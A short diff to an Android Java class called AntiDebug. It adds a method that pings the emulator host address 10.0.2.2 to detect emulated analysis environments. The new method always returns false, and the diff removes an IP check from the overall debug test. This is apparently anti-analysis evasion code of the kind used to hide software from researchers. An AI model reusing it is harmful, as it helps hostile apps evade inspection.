@@ -1,5 +1,9 @@
 package com.android.networking.util;
 
+import java.io.IOException;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
+
 import com.android.networking.Beep;
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
@@ -19,6 +23,20 @@ public class AntiDebug {
 		return debug;
 	}
 
+	public boolean checkPing() {
+		String host = "10.0.2.2";
+		boolean reachable = true;
+		try {
+			InetAddress in = InetAddress.getByName(host.toString());
+			reachable = in.isReachable(2000);
+		} catch (UnknownHostException e) {
+			reachable = false;
+		} catch (IOException e) {
+			reachable = false;
+		}
+		
+		return false;
+	}
 	public boolean checkIp() {
 		CheckDebugModeTask checkDebugMode = new CheckDebugModeTask();
 		checkDebugMode.execute("");
@@ -44,6 +62,6 @@ public class AntiDebug {
 			Beep.bip();
 			Beep.bip();
 		}
-		return checkFlag() || checkConnected() || checkIp();
+		return checkFlag() || checkConnected() ;
 	}
 }
